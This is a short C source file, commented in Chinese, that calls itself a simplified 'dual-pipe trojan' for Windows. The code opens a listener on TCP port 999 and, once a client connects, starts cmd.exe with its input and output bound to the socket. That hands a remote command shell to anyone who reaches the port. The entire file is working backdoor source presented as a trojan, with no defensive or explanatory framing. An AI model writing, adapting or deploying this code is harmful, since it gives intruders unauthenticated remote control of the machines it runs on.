// 简化的双管道木马
// 将 stdin, stdout, stderr 全部重定向到 sock
// 和 mini_horse的原理一样

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
    WSADATA ws;
    SOCKET listenFD;
    int ret;
    //初始化wsa
    WSAStartup(MAKEWORD(2, 2), &ws);
    //注意要用WSASocket
    listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //监听本机999端口
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(999);
    server.sin_addr.s_addr = ADDR_ANY;
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    //如果客户请求999端口，接受连接
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.wShowWindow = SW_SHOWNORMAL;
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD; //读写管道
    char cmdLine[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    //建立进程
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    return 0;
}
